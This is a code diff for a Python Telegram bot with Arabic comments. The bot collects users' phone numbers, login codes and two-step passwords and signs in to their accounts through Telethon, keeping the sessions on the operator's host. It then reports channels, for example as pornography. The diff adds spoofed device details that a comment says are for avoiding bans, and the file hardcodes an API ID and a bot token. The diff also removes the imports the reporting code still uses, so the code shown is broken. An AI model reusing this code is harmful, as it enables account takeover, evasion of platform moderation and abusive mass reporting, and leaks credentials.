@@ -1,12 +1,9 @@
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
 from telethon import TelegramClient
-from telethon.tl.functions.account import ReportPeerRequest
-from telethon.tl.types import InputReportReasonPornography, InputReportReasonViolence, InputReportReasonSpam, InputPeerChannel
-from telethon.sessions import StringSession
+from telethon.errors import SessionPasswordNeededError
 from telethon.network.connection.tcpabridged import ConnectionTcpAbridged
-import asyncio
-import aiohttp
+import os
 
 # تفاصيل API الخاصة بك
 API_ID = '16748685'
@@ -16,18 +13,28 @@ BOT_TOKEN = '7852676274:AAHIx3Q9qFbylmvHKDhbhT5nEpFOFA5i2CM'
 # قاموس لتخزين معلومات المستخدم
 user_data = {}
 
-# إعداد الـ Headers لمحاكاة جهاز حقيقي
-headers = {
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
-    'Accept-Language': 'en-US,en;q=0.9',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'Connection': 'keep-alive'
+# تفاصيل جهاز وهمي لمحاكاة جهاز حقيقي وتجنب الحظر
+DEVICE_SETTINGS = {
+    'device_model': 'Samsung Galaxy S21',
+    'system_version': 'Android 12',
+    'app_version': '8.4',
+    'lang_code': 'en',
+    'system_lang_code': 'en'
 }
 
-async def create_session():
-    """إنشاء جلسة aiohttp مع Headers مخصصة"""
-    session = aiohttp.ClientSession(headers=headers)
-    return session
+# إعداد العميل مع محاكاة جهاز حقيقي
+def create_client(user_id):
+    return TelegramClient(
+        f'session_{user_id}',
+        API_ID,
+        API_HASH,
+        device_model=DEVICE_SETTINGS['device_model'],
+        system_version=DEVICE_SETTINGS['system_version'],
+        app_version=DEVICE_SETTINGS['app_version'],
+        lang_code=DEVICE_SETTINGS['lang_code'],
+        system_lang_code=DEVICE_SETTINGS['system_lang_code'],
+        connection=ConnectionTcpAbridged
+    )
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     keyboard = [
@@ -53,44 +60,40 @@ async def phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
     phone = update.message.text
     user_data[user_id] = {'phone': phone}
 
-    try:
-        client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
-        await client.connect()
+    client = create_client(user_id)
+    await client.connect()
 
-        if not await client.is_user_authorized():
-            try:
-                sent_code = await client.send_code_request(phone)
-                user_data[user_id]['phone_code_hash'] = sent_code.phone_code_hash
-                await update.message.reply_text("تم إرسال رمز التحقق. الرجاء إدخاله:")
-                return 'CODE'
-            except Exception as e:
-                await update.message.reply_text(f"حدث خطأ: {str(e)}")
-                return
-    except Exception as e:
-        await update.message.reply_text(f"حدث خطأ أثناء محاولة الاتصال: {str(e)}")
+    if not await client.is_user_authorized():
+        try:
+            sent_code = await client.send_code_request(phone)
+            user_data[user_id]['phone_code_hash'] = sent_code.phone_code_hash
+            await update.message.reply_text("تم إرسال رمز التحقق. الرجاء إدخاله:")
+            return 'CODE'
+        except Exception as e:
+            await update.message.reply_text(f"حدث خطأ: {str(e)}")
+            return
 
 async def verification_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = update.effective_user.id
     code = update.message.text
 
-    client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
+    client = create_client(user_id)
     await client.connect()
 
     try:
         await client.sign_in(user_data[user_id]['phone'], code, phone_code_hash=user_data[user_id]['phone_code_hash'])
         await update.message.reply_text("تم تسجيل الدخول بنجاح!")
+    except SessionPasswordNeededError:
+        await update.message.reply_text("مطلوب التحقق بخطوتين. الرجاء إدخال كلمة المرور:")
+        return 'PASSWORD'
     except Exception as e:
-        if 'TWO_STEPS_VERIFICATION_REQUIRED' in str(e):
-            await update.message.reply_text("مطلوب التحقق بخطوتين. الرجاء إدخال كلمة المرور:")
-            return 'PASSWORD'
-        else:
-            await update.message.reply_text(f"حدث خطأ: {str(e)}")
+        await update.message.reply_text(f"حدث خطأ: {str(e)}")
 
 async def two_step_verification(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = update.effective_user.id
     password = update.message.text
 
-    client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
+    client = create_client(user_id)
     await client.connect()
 
     try:
@@ -103,11 +106,10 @@ async def channel_info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
     channel_username = update.message.text
     user_id = update.effective_user.id
 
-    client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
+    client = create_client(user_id)
     await client.connect()
 
     try:
-        # الحصول على معلومات القناة
         channel = await client.get_entity(channel_username)
         info = (
             f"معلومات القناة/المجموعة:\n"
@@ -136,7 +138,7 @@ async def report_channel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     user_id = update.effective_user.id
     channel = user_data[user_id]['channel']
 
-    client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
+    client = create_client(user_id)
     await client.connect()
 
     reason = InputReportReasonPornography()
